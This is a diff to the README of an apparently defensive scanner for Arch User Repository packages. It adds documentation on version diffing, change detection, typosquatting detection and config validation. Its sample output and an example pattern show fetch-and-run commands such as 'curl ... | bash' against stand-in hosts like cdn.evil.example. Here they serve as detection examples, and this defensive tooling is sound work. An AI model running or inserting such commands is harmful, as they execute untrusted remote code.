@@ -54,9 +54,11 @@ aur-scan system
   - [aur-scan install (race-free)](#aur-scan-install-race-free)
   - [aur-scan scan](#aur-scan-scan)
   - [aur-scan system](#aur-scan-system)
+  - [aur-scan diff](#aur-scan-diff)
   - [aur-scan ioc](#aur-scan-ioc)
   - [aur-scan codes](#aur-scan-codes)
   - [aur-scan explain](#aur-scan-explain)
+  - [aur-scan completions](#aur-scan-completions)
   - [Custom & Community Rules](#custom--community-rules)
 - [Integration Options](#integration-options)
   - [Level 1: Manual CLI](#level-1-manual-cli)
@@ -68,6 +70,8 @@ aur-scan system
   - [High Severity](#high-severity)
   - [Medium Severity](#medium-severity)
   - [Low/Informational](#lowinformational)
+- [Change Detection](#change-detection)
+- [Name Impersonation](#name-impersonation)
 - [Output Formats](#output-formats)
 - [Configuration](#configuration)
 - [Real-World Detection Examples](#real-world-detection-examples)
@@ -368,6 +372,54 @@ This command:
 database (see below) and runs the provenance check (flagging any package that
 *gained* risky behavior since the last scan).
 
+### aur-scan diff
+
+Compare two versions of a package and report what moved. Scans both sides and
+separates findings that **appeared** from findings that were already there,
+because those are not the same thing: a package that has always used a `SKIP`
+checksum has not changed, and a package that just grew a `curl | sh` has.
+
+```bash
+# Review an update before you take it
+aur-scan diff ./mytool-1.0 ./mytool-1.1
+
+# CI gate -- trips only on NEWLY ADDED findings, never on pre-existing state
+aur-scan diff ./old ./new --fail-on critical
+
+# Machine-readable
+aur-scan diff ./old ./new --format json
+```
+
+```
+Comparing 1.0-1 -> 1.1-1 (mytool)
+
+ADDED (5)
+  + CRITICAL  DLE-001  Curl pipe to shell
+  + CRITICAL  PERSIST-002  Systemd timer creation (install script)
+  + CRITICAL  EXEC-REMOTE  Fetches and runs code from https://cdn.evil.example/x.sh
+  + HIGH      FUNC-001  Network access in build function
+
+STRUCTURAL CHANGES
+  ~ gained an install script (runs as root)
+  ~ now fetches from github.com/notrealauthor/mytool
+  ~ no longer fetches from github.com/realauthor/mytool
+
+1 finding(s) carried over unchanged
+```
+
+Structural changes are reported separately because a severity count hides them:
+an install scriptlet appearing, or upstream moving to a different owner, may
+produce no findings at all on the day it happens and is still the single most
+important thing in the diff.
+
+Source URLs are compared at `host/owner/repo`, so routine version bumps and new
+release tarballs do **not** register as an upstream change — only upstream
+itself moving does.
+
+`diff` keeps no state, which makes it safe in a pipeline. For the same
+comparison performed automatically against your own scan history, see
+[Change Detection](#change-detection).
+
 ### aur-scan ioc
 
 Show or query the local IOC (indicator-of-compromise) database — known-malicious
@@ -432,6 +484,24 @@ Recommendation:
 Example Pattern:
   curl https://malicious.com/script.sh | bash
 ```
+
+---
+
+### aur-scan completions
+
+Generate a shell completion script. Packages install these automatically; this
+is for source builds and for regenerating them.
+
+```bash
+aur-scan completions bash > /usr/share/bash-completion/completions/aur-scan
+aur-scan completions zsh  > /usr/share/zsh/site-functions/_aur-scan
+aur-scan completions fish > /usr/share/fish/vendor_completions.d/aur-scan.fish
+```
+
+Completions are generated from the command tree itself, so they cannot drift
+from the real command surface. This subcommand deliberately does **not** read
+your configuration file: a typo in `config.toml` is a hard error everywhere
+else, and it must not be able to break your shell setup at package-install time.
 
 ---
 
@@ -740,6 +810,114 @@ and `aur-scan codes` surfaces a loud warning if any ID collides. A shipped examp
 `/usr/share/aur-scanner/rules.d/example.toml`. Use an org-specific prefix to
 avoid collisions.
 
+## Change Detection
+
+A PKGBUILD that was clean last week and is clean today is not the same thing as
+a PKGBUILD that was clean last week and grew a `curl | sh` today. Both score
+identically on a single scan; only the second is an incident.
+
+Every AUR supply-chain campaign on record worked by **changing packages people
+had already decided to trust** — the 2018 xeactor hijack and the June 2026
+Atomic Arch wave both adopted abandoned packages and then modified them. The
+change is the signal.
+
+`check` and `install` record a small fingerprint of every package they scan
+(under `$XDG_CACHE_HOME/aur-scan/history`, owner-readable only) and compare the
+next scan against it:
+
+| Code | Fires when | Severity |
+|------|-----------|----------|
+| `DIFF-001` | The package raises findings it did not raise last time | severity of the worst **new** finding |
+| `DIFF-002` | The maintainer changed — **High** if a previously orphaned package was adopted | High / Medium |
+| `DIFF-003` | A source now points at a `host/owner/repo` it did not use before | High |
+| `DIFF-004` | An install scriptlet or ALPM hook was **added** (High) or changed (Medium) | High / Medium |
+
+Deliberate non-behaviour:
+
+- **A first scan is silent.** There is nothing to compare against, and a tool
+  that complains about its own cold cache is noise.
+- **A plain version bump is silent.** Packages update constantly. Only new risk,
+  moved ownership, moved upstream, or a new install-time execution path is
+  reported.
+- **A corrupt or unwritable cache degrades to a first scan.** Change detection
+  is layered on top of the scan and can never turn a good scan into a failure.
+
+The history stores a summary — hashes, origins, finding IDs — not copies of
+every PKGBUILD you have ever scanned. Keeping the files would be a liability
+with no matching benefit.
+
+For an explicit, stateless comparison of two directories (code review, CI), use
+[`aur-scan diff`](#aur-scan-diff).
+
+---
+
+## Name Impersonation
+
+The package name is the only thing most people read before typing `yay -S`.
+Three separate attacks live in that gap, and they need very different evidence.
+
+| Code | Detects | Severity |
+|------|---------|----------|
+| `SQUAT-001` | A name that **renders identically** to a trusted one — Cyrillic `а` for ASCII `a`, or `foo_bar` for `foo-bar` | Critical |
+| `SQUAT-002` | One visually-similar or keyboard-adjacent keystroke from a high-value package, **and** no age or community standing of its own | High |
+| `SQUAT-003` | A `-bin`/`-git` variant in different hands from its base package — **informational context only** | Low |
+| `SQUAT-004` | A package inside a namespace **you declared you own**, published by an account you did not authorise | Critical |
+
+These thresholds were set by measurement, not intuition, against all 15,436
+official package names and all 119,170 AUR packages:
+
+- Edit-distance matching produced **23,662** false positives for two-character
+  edits and 2,039 for one-character insert/delete. Those kinds are **not
+  implemented** — not tuned down, absent.
+- Rendering collision produced **zero** false positives. Two honest packages
+  never display the same name.
+- One-character substitution produced 264 false positives corpus-wide (mostly
+  locale families like `aspell-ca`/`aspell-cs`), and zero once restricted to a
+  curated high-value target list and gated on registry standing.
+
+### Why `SQUAT-003` is only informational
+
+The AUR reserves no namespace: owning `foo` does not reserve `foo-bin`, and
+users reasonably assume `foo-bin` is your binary build. That is a real attack.
+
+It is also, measured against the live AUR, **42.5% of all build-variant
+packages** — 5,650 of them, where one person packages the release and someone
+else packages the git build. Narrowing to a differing upstream `url=` still
+leaves 1,820, mostly a project homepage on one side and its git repo on the
+other. No metadata field separates the impostor from those thousands, so the
+scanner reports the shape and lets you judge, rather than accusing 5,650
+maintainers of impersonation.
+
+Likewise, a variant of an **official repo** package is never reported: an AUR
+account is never the same hands as the Arch maintainers, so the comparison is
+true by construction and would flag 4,997 legitimate packages including
+`0ad-git` and `acl-git`.
+
+### Making it decisive: `[[owned_namespaces]]`
+
+The one thing that resolves the ambiguity is knowledge the scanner cannot
+derive — *you* know which names you publish. Declare them and the ambiguous case
+becomes a Critical with no false positives by construction:
+
+```toml
+[[owned_namespaces]]
+prefix = "aur-scanner"
+maintainers = ["KiefStudio"]
+```
+
+Any package matching `aur-scanner` or `aur-scanner-<variant>` maintained by
+anyone other than `KiefStudio` — including an orphaned one — is reported at
+Critical. The prefix matches the exact name or a `-`-separated suffix, so
+`aur-scannerfoo` is *not* in the namespace.
+
+Empty by default. No namespaces are assumed on your behalf.
+
+> Name analysis needs registry context (who maintains what, and the official
+> package list). A bare `aur-scan scan ./dir` has neither, so it emits no
+> `SQUAT-*` findings at all rather than guessing.
+
+---
+
 ## Output Formats
 
 ### Text (Default)
@@ -866,7 +1044,24 @@ line = true            # append (file:line) to each finding
 snippet = true         # show the matched code line
 recommendation = true  # show the remediation hint
 cwe = true             # show the CWE reference
+
+# Package-name namespaces YOU publish, and the accounts allowed to publish them.
+# Empty by default — nothing is assumed on your behalf.
+#
+# The AUR reserves no namespace: owning `foo` does not reserve `foo-bin`, and
+# anyone may publish it. Declaring your own names here turns that ambiguity into
+# a Critical finding with no false positives, because it uses knowledge the
+# scanner cannot derive. See "Name Impersonation".
+#
+# [[owned_namespaces]]
+# prefix = "aur-scanner"
+# maintainers = ["KiefStudio"]
 ```
+
+**Every key is validated.** A mistyped key anywhere in this file — not just in
+`[output]` — is a hard error rather than a silent no-op. A security setting that
+quietly evaporates because of a typo is worse than one that fails loudly: you
+would believe threat intel was on when it was not.
 
 > **Display-only.** The `[output]` table changes *what is printed*, never which
 > findings exist, the exit code, or whether a gate trips. The machine-readable
